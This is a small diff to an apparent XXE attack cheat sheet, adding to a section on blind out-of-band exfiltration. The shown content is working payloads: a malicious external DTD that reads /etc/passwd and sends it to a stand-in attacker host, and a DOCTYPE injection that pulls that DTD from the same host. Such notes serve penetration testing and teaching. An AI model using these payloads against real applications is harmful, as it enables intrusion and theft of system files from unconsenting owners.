@@ -118,9 +118,15 @@ Bypass filtering and validation:
 ```
 
 ### Exploiting blind XXE to exfiltrate data out-of-band
+malicious external DTD:
 ```
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
 %eval;
 %exfiltrate;
+```
+XXE payload to the vulnerable application:
+```
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"http://web-attacker.com/malicious.dtd"> %xxe;]>
 ```
